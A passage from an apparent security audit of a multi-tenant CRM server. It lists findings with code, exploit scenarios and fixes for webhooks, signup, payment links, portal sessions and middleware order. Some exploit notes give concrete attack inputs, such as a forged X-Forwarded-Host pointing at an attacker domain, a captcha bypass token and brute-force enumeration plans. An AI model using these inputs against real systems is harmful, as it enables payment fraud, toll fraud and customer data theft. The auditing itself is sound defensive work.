const forgotAttempts = countRateLimitAttempts(db, 'forgot_password', ip);
if (forgotAttempts >= CAPTCHA_FAILURE_THRESHOLD) {  // CAPTCHA_FAILURE_THRESHOLD = 5
  const captchaResult = await verifyHcaptcha(req.body?.captcha_token, ip);
  ...
}
```

**Exploit:**
The captcha gate provides zero additional protection for forgot-password. An attacker making 3 probes per hour hits the hard 429 immediately without ever solving a captcha. The intended captcha burden (solving between attempts 3–5) is entirely absent.

**Fix:**
Either lower `CAPTCHA_FAILURE_THRESHOLD` to 2 (requiring captcha on the 3rd attempt) or raise the hard rate-limit to 6+ so the captcha gate at 5 becomes reachable. The most useful configuration: captcha after N failures, hard block after M > N failures — e.g., captcha at 2, hard block at 5.

---

### [LOW] Duplicate captcha implementation in `signup.routes.ts` diverges from shared `hcaptcha.ts`

**Where:** `packages/server/src/routes/signup.routes.ts:253–366` and `packages/server/src/utils/hcaptcha.ts:55–122`

**What:**
`signup.routes.ts` contains a full standalone `verifyCaptchaToken()` function (lines 263–366) that duplicates the hCaptcha verification logic of the shared `verifyHcaptcha()` in `hcaptcha.ts`. The two implementations have already diverged: the local function has an additional `SIGNUP_CAPTCHA_REQUIRED` opt-out branch (lines 282–289) that the shared utility lacks. Any future fix applied to `hcaptcha.ts` (e.g., hostname assertion) must be manually mirrored to the local copy or it will silently not apply to signup. The comment in `hcaptcha.ts` even names this risk ("SEC-H94 agent may also generate this file. Last writer wins").

**Code:**
```typescript
// signup.routes.ts:263 — fully duplicated function
async function verifyCaptchaToken(token: unknown, ip: string): Promise<{ ok: boolean; reason?: string }> { … }

// hcaptcha.ts:55 — shared utility
export async function verifyHcaptcha(token: unknown, remoteIp: string): Promise<HCaptchaResult> { … }
```

**Exploit:**
When hostname assertion or replay-prevention logic is added to `hcaptcha.ts`, the identical gap in `verifyCaptchaToken` means signup remains unprotected. A security review that patches only the shared helper misses the local copy.

**Fix:**
Delete `verifyCaptchaToken` from `signup.routes.ts` and replace all three call sites (POST /signup, GET /check-slug) with the shared `verifyHcaptcha()` from `hcaptcha.ts`. Port the `signupCaptchaRequired` opt-out logic into `verifyHcaptcha` as a named option parameter so the shared function handles all captcha verification across the codebase.

---

### [LOW] In-memory pending-signup map stores admin password in plaintext

**Where:** `packages/server/src/routes/signup.routes.ts:104–114`

**What:**
The `pendingSignups` Map (used in the production email-verification path, currently bypassed by `TEMP-NO-EMAIL-VERIF`) stores the raw `adminPassword` string in plaintext for up to 1 hour (the `PENDING_SIGNUP_TTL_MS` window). If the process heap is dumped (core dump, `process.memoryUsage` endpoint, or a memory-leak diagnostic tool), the plaintext passwords of all pending signups are recoverable. The `logger.info` call at line 673 also logs the `tokenPrefix` to the logging system, which keeps those tokens alive in log aggregators longer than intended.

**Code:**
```typescript
const pendingSignups = new Map<string, {
  slug: string; shopName: string; adminEmail: string;
  adminPassword: string;   // plaintext for up to PENDING_SIGNUP_TTL_MS = 1h
  …
}>();
```

**Exploit:**
An attacker who obtains a heap dump or can trigger a process crash with core dump recovers all pending admin passwords. Combined with the tenant `adminEmail`, they have full admin credentials for accounts that have not yet been activated.

**Fix:**
Bcrypt-hash `adminPassword` before storing it in `pendingSignups` (12 rounds to match production), then pass the hash to `provisionTenant` after removing the plain-text hash step there. Alternatively, require the user to re-enter the password at the /verify step and never store it in-memory.

---

### [INFO] `dev-captcha-token` bypass string is a well-known constant across the codebase

**Where:** `packages/server/src/utils/hcaptcha.ts:63` and `packages/server/src/routes/signup.routes.ts:268`

**What:**
Both captcha verifiers accept the literal string `'dev-captcha-token'` as a bypass when `NODE_ENV !== 'production'`. This string is hardcoded in the source and visible in any Git clone or code review. If a staging or CI environment runs with `NODE_ENV` set to anything other than `'production'` (e.g., `'staging'`, `'test'`, `'qa'`), the bypass is active and any request with `captcha_token: "dev-captcha-token"` skips captcha verification entirely. The guard relies on the operator setting exactly `NODE_ENV=production` for every non-local deployment.

**Code:**
```typescript
// hcaptcha.ts:63
if (!isProd && responseToken === 'dev-captcha-token') {
  return { ok: true };
}
```

**Fix:**
Add a separate `CAPTCHA_DEV_TOKEN` environment variable (defaulting to a random value at startup) rather than a hardcoded string. Alternatively, gate the bypass additionally on `HCAPTCHA_ENABLED !== 'true'` so it can never fire in any deployment that has `HCAPTCHA_SECRET` set, regardless of `NODE_ENV`.

---

### [INFO] No captcha on public booking GET endpoints — acceptable, but future POST submission route needs it

**Where:** `packages/server/src/routes/bookingPublic.routes.ts`

**What:**
The public booking router (`/public/api/v1/booking`) currently exposes only GET /config (60 req/IP/hr) and GET /availability (120 req/IP/hr). Both are read-only and IP rate-limited; no captcha is applied. There is no POST endpoint for submitting a booking request in this file. Leads (`leads.routes.ts`) are internal-only (authenticated via `authMiddleware`). The current surface is acceptable. However, the comment at `portal.routes.ts:720–723` explicitly notes `SEC-M21-captcha` (CAPTCHA on portal send-code) as a pending TODO — if a public booking-submission POST is added in the future, it will need captcha from the start.

**Fix:**
Track the future booking-submission endpoint in the backlog with a `CAPTCHA_REQUIRED` annotation. When implementing it, wire `verifyHcaptcha()` before any write operation (appointment creation, lead creation, or customer lookup).

---


---

# S35-public-surface

# S35 — Public/Unauthenticated Surface Security Findings

**Scope:** `bookingPublic.routes.ts`, `portal.routes.ts`, `portal-enrich.routes.ts`, `voice.routes.ts`, `paymentLinks.routes.ts`, `estimateSign.routes.ts`, `ticketSignatures.routes.ts`, `leads.routes.ts`, `signup.routes.ts`, `tracking.routes.ts`

---

### HIGH — `voiceInstructionsHandler` has no webhook signature verification

**Where:** `packages/server/src/routes/voice.routes.ts:694–720`; mounted at `packages/server/src/index.ts:1562`

**What:**
`voiceInstructionsHandler` is the TwiML/TeXML/BXML/NCCO endpoint that the telephony provider calls to get call routing instructions. All other voice webhook handlers (`voiceStatusWebhookHandler`, `voiceRecordingWebhookHandler`, `voiceTranscriptionWebhookHandler`, `voiceInboundWebhookHandler`) check `provider.verifyWebhookSignature`. `voiceInstructionsHandler` skips this check entirely and reads `?to=` from an unauthenticated GET request.

**Code:**
```typescript
export async function voiceInstructionsHandler(req: Request, res: Response): Promise<void> {
  // No provider.verifyWebhookSignature call here
  const action = (req.params.action as string) || 'connect';
  const to = (req.query.to as string) || '';
  const provider = getSmsProvider();
  // ...
  if (!provider.generateCallInstructions) {
    res.type('text/xml').send(`<?xml version="1.0" encoding="UTF-8"?>
<Response><Dial>${escapeXml(to)}</Dial></Response>`);
```

**Exploit:**
An external attacker can GET `/api/v1/voice/instructions/connect?to=%2B15551234567` to get TwiML returned that dials an arbitrary number. If Twilio fetches this URL in response to an inbound call, the attacker has effectively hijacked call routing. By calling the store's number and forcing a fraudulent TwiML response, toll fraud or call redirection is possible without any credentials.

**Fix:**
Add `if (provider.verifyWebhookSignature && !provider.verifyWebhookSignature(req)) { res.status(403)... return; }` at the top of `voiceInstructionsHandler`, matching the pattern used in the four other voice webhook handlers. Alternatively, add a static Twilio IP allowlist at the middleware level.

---

### HIGH — Signup email verification unconditionally bypassed in production

**Where:** `packages/server/src/routes/signup.routes.ts:618`

**What:**
The `skipEmailVerification` constant is hardcoded to `true` (a "TEMP-NO-EMAIL-VERIF" workaround), meaning every `POST /signup` immediately provisions a tenant without verifying the submitted email address. Any attacker can enumerate email addresses by creating tenants with victim emails, create fake tenants under any domain, and exhaust subdomain/slug space — all without proving ownership of the email. The comment says this must be reverted before public SaaS launch, but the flag is currently active on the production codebase.

**Code:**
```typescript
// TEMP-NO-EMAIL-VERIF (2026-04-24): email verification fully disabled
const skipEmailVerification = true;
if (skipEmailVerification) {
  logger.warn('signup: TEMP-NO-EMAIL-VERIF — email verification disabled', ...);
  const result = await provisionTenant({...});
```

**Exploit:**
Attacker POSTs `{ slug: "victim-shop", admin_email: "victim@company.com", admin_password: "x", shop_name: "...", captcha_token: "dev-captcha-token" }` (in dev) or any valid captcha (in prod). A tenant is provisioned immediately, the subdomain `victim-shop.bizarrecrm.com` is taken, and victim's email is associated with an attacker-controlled shop. The 3/hr IP rate limit is bypassable by rotating IPs.

**Fix:**
Set `const skipEmailVerification = process.env.SKIP_EMAIL_VERIFICATION === '1' && config.nodeEnv !== 'production';` and ensure SMTP is configured. Remove the temp bypass before any public launch.

---

### HIGH — Plaintext admin password stored in in-memory map during email verification flow

**Where:** `packages/server/src/routes/signup.routes.ts:105–114`, `660–669`

**What:**
When email verification is enabled (the non-bypassed path), the raw plaintext `adminPassword` is stored in the `pendingSignups` Map for up to 1 hour until the user clicks the verification link. Any heap dump, core dump, debug endpoint, or process memory exposure during that window leaks plaintext credentials. The password is only bcrypt-hashed in `provisionTenant` (called at click-time), but the in-memory store holds the raw value.

**Code:**
```typescript
const pendingSignups = new Map<string, {
  slug: string;
  shopName: string;
  adminEmail: string;
  adminPassword: string;  // ← plaintext
  // ...
}>();
// Later at signup time:
pendingSignups.set(verifyToken, {
  adminPassword: admin_password,  // raw from request body
```

**Exploit:**
An attacker who gains read access to the Node.js heap (via `--inspect` port, `/metrics` endpoint, or OS-level) can extract plaintext passwords for all users who signed up but have not yet verified their email.

**Fix:**
Hash the password immediately with `bcrypt.hash(admin_password, 12)` at POST /signup time before storing in `pendingSignups`. Pass the hash to `provisionTenant` instead of the raw password, and update `provisionTenant` to accept a pre-hashed value.

---

### MEDIUM — `voiceInstructionsHandler` accepts arbitrary `?to=` phone number without validation

**Where:** `packages/server/src/routes/voice.routes.ts:698–720`

**What:**
The `?to` query parameter is read verbatim from an unauthenticated GET request and passed directly to `provider.generateCallInstructions(action, { to, ... })` or escaped into TwiML. There is no validation that `to` is a valid phone number format, or any restriction on what numbers can be dialed. Beyond the signature-bypass issue above, even if signature verification were added, this endpoint lets the telephony provider dial any number specified in the TwiML URL — including premium-rate numbers.

**Code:**
```typescript
const to = (req.query.to as string) || '';
// ...
if (!provider.generateCallInstructions) {
  res.type('text/xml').send(`<Response><Dial>${escapeXml(to)}</Dial></Response>`);
```

**Exploit:**
If an attacker can forge Twilio signatures (or in the current no-verification state), they can dial premium-rate numbers, international numbers, or other high-cost destinations by crafting requests to this endpoint.

**Fix:**
Validate `to` against an E.164 phone number regex (`/^\+?[1-9]\d{1,14}$/`). Optionally add a country-code or prefix allowlist matching the tenant's country setting.

---

### MEDIUM — Payment link `callbackUrl` built from untrusted `X-Forwarded-Host` header

**Where:** `packages/server/src/routes/paymentLinks.routes.ts:386–388`

**What:**
The `POST /:token/pay` public endpoint (no auth) builds the BlockChyp `callbackUrl` using `req.headers['x-forwarded-host']` before falling back to `req.headers.host`. If `X-Forwarded-Host` is not validated against the trusted proxy allowlist, an attacker can supply a forged `X-Forwarded-Host: evil.com` header and redirect the BlockChyp payment callback (including payment confirmation) to an attacker-controlled server. The `callbackUrl` endpoint (`/paid-callback`) is also mentioned in the code but does not appear to be implemented, meaning payment confirmations silently fail regardless.

**Code:**
```typescript
const protocol = req.headers['x-forwarded-proto'] || (req.secure ? 'https' : 'http');
const host = req.headers['x-forwarded-host'] || req.headers.host || 'localhost';
const callbackUrl = `${protocol}://${host}/api/v1/public/payment-links/${encodeURIComponent(token)}/paid-callback`;
```

**Exploit:**
Attacker sends `POST /api/v1/public/payment-links/<token>/pay` with `X-Forwarded-Host: attacker.com`. BlockChyp posts payment confirmation to `https://attacker.com/...`, attacker can see the payment was completed and mark it as paid on their side while the server never marks the link paid (since `/paid-callback` isn't implemented).

**Fix:**
Use `req.hostname` (which respects Express's `trust proxy` setting) or the configured `config.baseDomain` instead of reading `X-Forwarded-Host` directly. Add the paid-callback handler with BlockChyp signature verification.

---

### MEDIUM — Portal-enrich v2 `portalAuth` does not enforce idle timeout (4h rule bypass)

**Where:** `packages/server/src/routes/portal-enrich.routes.ts:65–98`

**What:**
The `portalAuth` middleware in `portal-enrich.routes.ts` only checks `expires_at > datetime('now')` but does not check `last_used_at` for idle session enforcement. By contrast, `portal.routes.ts:portalAuth` enforces a 4-hour idle timeout (SEC-M45) and evicts sessions that have not been used recently. A compromised or stolen portal session can be used indefinitely on the v2 enrichment routes (receipt PDFs, warranty certs, loyalty, referrals, photos, reviews) until the 24-hour absolute expiry, even if the customer logged out or the session was considered idle.

**Code:**
```typescript
// portal-enrich.routes.ts portalAuth — no last_used_at check:
const session = await adb.get<AnyRow>(
  `SELECT customer_id, scope, ticket_id, token
     FROM portal_sessions
    WHERE token = ? AND expires_at > datetime('now')`,
  token,
);
// no idle-timeout check, no last_used_at update
```

**Exploit:**
Attacker steals a portal session token (e.g. via network interception on HTTP, SSRF, or log exposure). On portal v1 routes the session would be evicted after 4h idle. On portal v2 (`/portal/api/v2/*`) the attacker can continue reading receipts, warranty certs, loyalty points, and submitting reviews for up to 24 hours even after the customer's v1 session was kicked.

**Fix:**
Extract the idle-timeout logic from `portal.routes.ts:portalAuth` into a shared utility and apply it in `portal-enrich.routes.ts:portalAuth`. Also update `last_used_at` on every v2 request so the idle window resets for active sessions.

---

### MEDIUM — Referral code has only 24 bits of entropy (16.7M space), brute-forceable

**Where:** `packages/server/src/routes/portal-enrich.routes.ts:211–213`

**What:**
`generateReferralCode()` returns `crypto.randomBytes(3).toString('hex').toUpperCase()` — a 6-character hex string with 24 bits of entropy (16,777,216 possible values). Referral codes are publicly usable (they're shared with potential new customers). If the referral-redeem endpoint doesn't have its own rate limit, the entire code space can be exhausted in hours with a modest botnet.

**Code:**
```typescript
function generateReferralCode(): string {
  return crypto.randomBytes(3).toString('hex').toUpperCase(); // 6 chars, 16M space
}
```

**Exploit:**
Attacker bruteforces valid referral codes to claim loyalty rewards or referral bonuses without a real referral. With 16M codes and a 30-request/min rate limit, the full space can be scanned in ~9 months from one IP, or much faster from a botnet.

**Fix:**
Increase to at least `crypto.randomBytes(8).toString('base64url')` (~11 chars, 64 bits entropy). Alternatively, add a per-IP rate limit on the referral-redeem endpoint and limit redemptions per code.

---

### MEDIUM — Public estimate sign endpoint — no captcha, no identity verification

**Where:** `packages/server/src/routes/estimateSign.routes.ts:497–642`

**What:**
`POST /public/api/v1/estimate-sign/:token` accepts `signer_name` (free text, ≤200 chars), optional `signer_email`, and a signature image. The signer's identity is entirely self-asserted — anyone with the sign link can submit any name. The rate limit is only 10 requests/hr per IP, which is adequate for brute-force protection but does not prevent a person who intercepts a sign link from signing as "CEO John Smith" on a contract. There is no captcha, no email OTP, and no identity cross-check against the estimate's customer record.

**Code:**
```typescript
const signerName = (req.body.signer_name || '').trim();
if (!signerName || signerName.length > 200) {
  throw new AppError('signer_name is required and must be ≤ 200 characters', 400);
}
// No verification that signerName matches the estimate's customer
```

**Exploit:**
Attacker intercepts the sign link (e.g., via email forwarding, shoulder-surfing, or shared device). They submit `signer_name: "Customer Name"` (which they read from the estimate's line items visible in the GET response), sign the estimate, and it is legally binding. The audit log shows `signer_ip` but not whether identity was verified.

**Fix:**
Add a light identity gate: require `signer_email` and verify it matches the estimate's customer email (compare via constant-time hash to avoid timing leak). If no email on file, require the last-4 of the customer's phone number. Document the limitation as INFO if a fully-unverified design decision is intentional.

---

### MEDIUM — `POST /api/v1/track/lookup` uses suffix-LIKE to find customers by phone last-4, leaks all customer tickets

**Where:** `packages/server/src/routes/tracking.routes.ts:263–273`

**What:**
The `/lookup` endpoint finds customers by matching the last 4 digits of the phone number with `LIKE '%${last4}'`. This is a known-weak authentication factor: with only 10,000 possible last-4 values (0000–9999), an attacker can iterate all combinations from multiple IPs to enumerate every customer's ticket list. Although there is a per-last4 rate limit of 10/hr, only 3 digits of per-IP rate limiting (1 per 5s) protects the global surface. A botnet rotating 10 IPs can exhaust all 10,000 last-4 combinations in under 14 hours.

**Code:**
```typescript
const last4Key = `lookup_last4:${last4}`;
if (!checkWindowRate(req.db, 'tracking_last4', last4Key, 10, 60 * 60 * 1000)) {
// ...
const customers = await adb.all<AnyRow>(`
  WHERE ...
    LIKE ?
`, `%${last4}`, `%${last4}`, `%${last4}`);
```

**Exploit:**
Attacker iterates all 10,000 last-4 combinations with 10 IPs (1 per 5s each), receiving all customer tickets per phone segment. This allows customer enumeration and reveals repair history, customer names, and device types across the entire tenant.

**Fix:**
Require both last-4 AND an order_id to narrow the lookup to a specific customer's ticket (the `order_id` filter already exists but is optional). Make both fields mandatory in `/lookup`, or add a CAPTCHA gate after 3 failed lookups per IP.

---

### LOW — Portal session token returned in JSON response body (not just httpOnly cookie)

**Where:** `packages/server/src/routes/portal.routes.ts:521`, `675–683`

**What:**
Both `POST /quick-track` and `POST /login` return the portal session token in the JSON response body (`{ data: { token, ... } }`). While this is intentional for API clients (mobile apps), it means the token is also returned to web clients where it could be read by any JavaScript (XSS). The httpOnly cookie pattern (used for staff JWT) would prevent XSS token theft. Additionally, a token logged via `audit()` would expose it in audit logs.

**Code:**
```typescript
// POST /quick-track response:
res.json({ success: true, data: { token, csrf_token: csrfToken, ticket: detail } });
// POST /login response:
res.json({ success: true, data: { token, csrf_token: csrfToken, ... } });
```

**Exploit:**
An XSS vulnerability anywhere on the portal page (including third-party widgets, Google review redirect) can steal the portal session token from JavaScript-accessible memory or `localStorage` if the frontend stores it there.

**Fix:**
Issue the portal session token as an `httpOnly; SameSite=Strict` cookie (matching the staff refresh token pattern), eliminating JS-readable token exposure. Keep the JSON body token for backward-compat of native app clients only if needed, with explicit documentation.

---

### LOW — Tracking endpoint `GET /track/portal/:orderId` returns IMEI/serial (selected but not mapped in response)

**Where:** `packages/server/src/routes/tracking.routes.ts:414–417`, `477–482`

**What:**
The SQL query for `GET /track/portal/:orderId` selects `imei, serial_number` from `ticket_devices`, but the response mapping only includes `name, type, status, due_on, notes`. The IMEI and serial are currently not returned because they are not mapped. However, this is a latent PII exposure risk — if a developer adds them to the response object without realizing they are sensitive, or if the code is refactored to use `...d` spread, IMEI and serial numbers would be exposed to anyone with a tracking token.

**Code:**
```typescript
SELECT device_name, device_type, imei, serial_number, status, due_on, additional_notes
FROM ticket_devices WHERE ticket_id = ?
// ...
devices: devices.map(d => ({
  name: d.device_name,
  type: d.device_type,    // imei and serial_number NOT included but ARE fetched
  status: d.status,
```

**Exploit:**
Low severity currently (not returned), but if the select list or mapping changes, full IMEI/serial numbers would be exposed to any user with a tracking token (which is 64-bit random, but still unauthenticated access to sensitive hardware identifiers).

**Fix:**
Remove `imei, serial_number` from the SELECT in the tracking portal query since they are not used in the response. This eliminates the latent risk and reduces DB data transfer.

---

### LOW — Estimate sign link default TTL is 30 days (exceeds recommended maximum)

**Where:** `packages/server/src/routes/estimateSign.routes.ts:38`, `40`

**What:**
`DEFAULT_TTL_MINUTES = 4320` (3 days). `MAX_TTL_MINUTES = 30 * 24 * 60` (30 days). The comment in the hunt prompt flags portal tokens > 30 days; here the estimate sign URL can be valid for up to 30 days. Given that no identity verification is performed on the signer, a sign link intercepted from an email can be used for up to 30 days to submit a fraudulent signature. The HMAC is single-use (consumed_at), so replay is prevented, but the long window allows interception attacks.

**Code:**
```typescript
const DEFAULT_TTL_MINUTES = 4320; // 3 days
const MAX_TTL_MINUTES = 30 * 24 * 60; // 30 days max
```

**Exploit:**
Admin issues a sign link to a customer with a 30-day TTL. Attacker intercepts the email (via compromised email account, MITM on email delivery). Up to 30 days later, attacker submits the signature.

**Fix:**
Reduce `MAX_TTL_MINUTES` to 7 days maximum and `DEFAULT_TTL_MINUTES` to 48 hours. Consider sending a reminder SMS/email with a fresh link if the original expires unused.

---

### LOW — `POST /api/v1/track/portal/:orderId/message` does not validate message content size before trim

**Where:** `packages/server/src/routes/tracking.routes.ts:709–721`

**What:**
The message content is truncated to 5000 characters via `.slice(0, 5000)` before INSERT, but no explicit rejection of oversized content occurs. A body parser limit of 1MB (`express.json({ limit: '1mb' })`) is the only upstream guard. An attacker can POST a ~1MB content field, which is accepted, processed, and silently truncated. This is a minor DoS/spam amplification concern (wasting DB writes and body parsing).

**Code:**
```typescript
const rawContent = typeof content === 'string' ? content : ...;
const trimmedContent = rawContent.trim();
// ...
`, ticket.id, trimmedContent.slice(0, 5000));
```

**Exploit:**
Attacker submits 1MB messages on behalf of a ticket, generating noise in the ticket notes and consuming DB space. Rate limit (3/min per IP) partially mitigates this.

**Fix:**
Add `if (trimmedContent.length > 5000) { return res.status(400)...'Message too long (max 5000 chars)' }` before the INSERT, making the limit explicit and rejecting rather than silently truncating.

---

### INFO — SMS `send-code` endpoint lacks CAPTCHA (SEC-M21-captcha deferred)

**Where:** `packages/server/src/routes/portal.routes.ts:721–724`

**What:**
The portal `POST /register/send-code` SMS OTP endpoint has rate limits (3/hr per phone, 1/5s per IP, 10/day per phone) but explicitly defers a CAPTCHA integration as `SEC-M21-captcha` out-of-scope. Without CAPTCHA, a distributed botnet can continuously send SMS codes to victim phone numbers at the rate limit (up to 10/day per phone), which counts as SMS spam/harassment and inflates the tenant's SMS costs.

**Fix:**
Implement the deferred SEC-M21-captcha: add hCaptcha or Turnstile verification after the first 2 code requests per phone per hour. The `verifyCaptchaToken` helper from `signup.routes.ts` can be reused.

---

### INFO — Payment link `/paid-callback` webhook handler does not exist

**Where:** `packages/server/src/routes/paymentLinks.routes.ts:388`

**What:**
The `POST /:token/pay` handler constructs `callbackUrl = .../paid-callback` and passes it to BlockChyp, but no route handler for `paid-callback` is registered anywhere in the codebase. When a customer completes payment on BlockChyp's hosted page, the callback fires to an unregistered route (404) and the payment link is never marked as `paid`. This is a business logic gap — payments succeed at the provider but the payment link remains `active`, potentially allowing the customer to pay again or the shop to not receive the paid status.

**Fix:**
Implement `POST /api/v1/public/payment-links/:token/paid-callback` with BlockChyp signature verification, then update the `payment_links` row to `status = 'paid'`, `paid_at = now()`, and broadcast the update via WebSocket.

---


---

# S36-holistic

# S36 — Holistic: End-to-End App, Middleware Order, Cross-Module Composition, Security Model Coherence

Auditor: S36 slot (holistic)
Scope: `packages/server/src/index.ts` (3924 lines) + all middleware, WS, cron, and cross-module composition

---

## Middleware Execution Order (confirmed good)

The verified order is:
1. TCP SNI multiplexer → HTTPS server
2. HTTP→HTTPS redirect (sanitized host/URL)
3. Request-ID generation
4. errorEnvelopeMiddleware (patch res.json before routes)
5. compression
6. helmet (CSP, HSTS, noSniff, referrer, frameguard)
7. Permissions-Policy
8. CORS (origin allowlist; credentials:true; no wildcard reflection)
9. Production origin guard (blocks Origin-less state-changing API calls)
10. cookieParser
11. **Global API rate limiter** (`/api/v1`, 300/min per IP, DB-backed)
12. Stripe webhook express.raw() mount (before JSON parser — correct)
13. Large-body carve-out for `/api/v1/catalog/bulk-import` (before global JSON parser)
14. express.json() (1 MB limit, rawBody captured)
15. express.urlencoded() (1 MB limit)
16. requestLogger
17. Cache-Control headers (PII paths → no-store; GET → no-cache)
18. req.db = global db (default)
19. **tenantResolver** (multi-tenant: resolves slug from Host, sets req.db, req.tenantSlug, req.tenantPlan)
20. **CSRF content-type guard** (blocks non-JSON/non-multipart POST/PUT/PATCH/DELETE)
21. crashGuardMiddleware
22. Route handlers (individual authMiddleware per mount)
23. SPA fallback
24. errorHandler

---

### [MEDIUM] tenantResolver DB-error path calls next() without tenant context — unauthenticated routes served with wrong DB

**Where:** `packages/server/src/middleware/tenantResolver.ts:453-456`

**What:**
When the master DB query to look up a tenant slug fails (e.g., DB locked, disk full), the resolver calls `next()` without setting `req.tenantSlug` or updating `req.db` beyond the global default DB already set at line 1271. Auth-gated routes are still protected (authMiddleware at line 100 of auth.ts rejects requests without `req.tenantSlug` in multi-tenant mode), but unauthenticated routes — `/api/v1/portal`, `/api/v1/track`, `/api/v1/tv`, `/portal/api/v2` — will proceed and query the wrong (global single-tenant) database, leaking that shop's data or silently returning empty results to the wrong tenant's subdomain.

**Code:**
```typescript
  try {
    tenant = masterDb.prepare(
      "SELECT id, slug, status, db_path, plan, max_tickets_month, max_users, storage_limit_mb, trial_started_at, trial_ends_at FROM tenants WHERE slug = ?"
    ).get(slug) as typeof tenant;
  } catch (err) {
    log.error('tenant_db_query_failed', { slug, err: err instanceof Error ? err.message : String(err) });
    next(); // Let the request through — better to serve static assets than crash
    return;
  }
```

**Exploit:**
If the master DB is briefly locked during a backup or WAL checkpoint, an attacker requests `GET https://evilslug.example.com/api/v1/track/ORD-123`. The resolver can't look up `evilslug`, calls `next()`, the tracking route queries the global `db`, and returns ticket-tracking data belonging to the single-tenant default shop. Cross-tenant data exposure for any public endpoint.

**Fix:**
Replace the `next()` call in the DB error branch with `res.status(503).json(...)`, refusing to serve the request rather than falling back to the wrong DB. Only non-API static asset paths (already handled before slug extraction) should fall through.

---

### [MEDIUM] Webhook rate limiter uses hardcoded global `db` — wrong store in multi-tenant mode

**Where:** `packages/server/src/index.ts:1538-1551`

**What:**
`webhookRateLimit()` always calls `consumeWindowRate(db, ...)` where `db` is the module-level single-tenant DB handle. In multi-tenant mode, rate limit state for all tenants' webhooks is stored in this global DB (which belongs to the single-tenant installation and is separate from the master DB or any tenant DB). This means: (a) rate limit records from SMS/voice webhooks cross-pollinate across the entire fleet against an unrelated data store; (b) if the operator has removed the single-tenant DB or it is otherwise unavailable in a pure multi-tenant deployment, `consumeWindowRate` throws and the webhook returns 500; (c) an attacker can exhaust the 60 req/min global budget for one IP across ALL tenants by flooding any one tenant's webhook URL.

**Code:**
```typescript
function webhookRateLimit(req: any, res: any, next: any) {
  const ip = req.ip || req.socket?.remoteAddress || 'unknown';
  const result = consumeWindowRate(db, 'webhook', ip, WEBHOOK_RATE_LIMIT, WEBHOOK_RATE_WINDOW);
  // db is the module-level single-tenant db, not req.db or getMasterDb()
  ...
}
```

**Exploit:**
In multi-tenant SaaS mode, an attacker floods `POST /api/v1/t/shop-a/sms/inbound-webhook` at 60 req/min from a single IP. This fills the global rate limit bucket; all other tenants' webhooks from that IP are rejected for the 60-second window — including a shop that received a legitimate payment confirmation SMS.

**Fix:**
Use `getMasterDb()` (the correct multi-tenant shared store) in multi-tenant mode, falling back to `db` in single-tenant mode. Or use `req.db` after `tenantResolver` has run (webhook tenant resolver sets it). Add `if (config.multiTenant) { const rdb = getMasterDb() ?? db; ... } else { ... }`.

---

### [MEDIUM] Global API rate limiter runs BEFORE tenantResolver — all tenants share bucket in global DB

**Where:** `packages/server/src/index.ts:1181-1208` (rate limiter) vs `1276` (tenantResolver)

**What:**
The `/api/v1` rate limiter at line 1181 fires before `tenantResolver` at line 1276. At rate-limit time, `req.db` is the global single-tenant DB (set at line 1272). The comment acknowledges this: "Use req.db when available (tenant context), fall back to the module-level db for unauthenticated requests". But in practice, tenantResolver hasn't run yet, so `(req.db as Database.Database | undefined) ?? db` always evaluates to `db` — the global DB — for every request. In multi-tenant mode the rate limit table is effectively in the wrong store and all tenant traffic competes in the same bucket keyed only by IP.

**Code:**
```typescript
app.use('/api/v1', (req, res, next) => {   // line 1181
  ...
  const limitDb: Database.Database = (req.db as Database.Database | undefined) ?? db;
  const result = consumeWindowRate(limitDb, 'api_v1', ip, API_RATE_LIMIT, API_RATE_WINDOW);
  ...
});
// ...
app.use(tenantResolver); // line 1276 — runs AFTER rate limiter
```

**Exploit:**
A tenant at `shop-a.example.com` makes 300 API calls/minute. This fills the rate bucket in the global DB (not shop-a's own DB). Now a request from the same IP to `shop-b.example.com` is immediately rate-limited even though shop-b's own DB is empty. Effective denial-of-service across tenants from a single IP.

**Fix:**
Move the global rate limiter AFTER tenantResolver (line 1276), so `req.db` is properly set to the tenant DB. Alternatively, always use `getMasterDb()` for the shared rate limit store in multi-tenant mode.

---

### [MEDIUM] Double-mount of importRoutes at unauthenticated prefix exposes all import routes without authMiddleware

**Where:** `packages/server/src/index.ts:1657-1658`

**What:**
`importRoutes` is mounted twice: once at `/api/v1/import/oauth` without `authMiddleware` (for the OAuth callback URL), and once at `/api/v1/import` with `authMiddleware`. Express matches the first applicable mount, so any request to `/api/v1/import/oauth/<anything>` bypasses authMiddleware entirely. The router's internal `requireAdmin(req)` helper checks `req.user?.role !== 'admin'`, but `req.user` is only set by `authMiddleware` — which didn't run. Without `req.user`, the check always fails and throws AppError 403, which protects the oauth endpoints. However, any future route added to `importRoutes` at a path starting with `/oauth/` would be reachable without the proper authMiddleware, and developers may not realize the route is exposed unauthenticated.

**Code:**
```typescript
// OAuth callback must be public (RD redirects browser here before CRM login)
app.use('/api/v1/import/oauth', importRoutes);   // NO authMiddleware — all importRoutes accessible here
app.use('/api/v1/import', authMiddleware, importRoutes);
```

**Exploit:**
The current oath-specific routes are protected by manual `requireAdmin(req)` checks. However, a developer adding a new route like `router.get('/oauth/status', ...)` that forgets `requireAdmin()` would be publicly accessible at `/api/v1/import/oauth/status` with zero authentication.

**Fix:**
Create a dedicated mini-router containing only the OAuth callback route and mount it at `/api/v1/import/oauth`. Mount the main `importRoutes` only once, behind `authMiddleware`. The OAuth callback itself should continue using `requireAdmin()` and also verify session via authMiddleware before `requireAdmin()` is meaningful.

---

### [MEDIUM] CSRF content-type bypass via path substring match for `/setup`

**Where:** `packages/server/src/index.ts:1283-1299`

**What:**
The CSRF content-type guard exempts any request path containing the substring `/setup` from the content-type requirement. This is checked with `req.path.includes('/setup')`, which matches any path with those characters anywhere — including `/api/v1/settings/complete-setup`, `/api/v1/auth/login/2fa-setup`, and any future route that happens to contain "setup". This overly broad exemption means an attacker can send an `application/x-www-form-urlencoded` body to those routes (which bypass CSRF protection), since the body parser at line 1233 already parses urlencoded bodies and populates `req.body`. The CSRF guard is then bypassed.

**Code:**
```typescript
app.use((req, res, next) => {
  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
    const ct = req.headers['content-type'] || '';
    if (ct.includes('application/json') || ct.includes('multipart/form-data') ||
        req.path.includes('webhook') || req.path.includes('/setup')) {  // ← overly broad
      return next();
    }
```

**Exploit:**
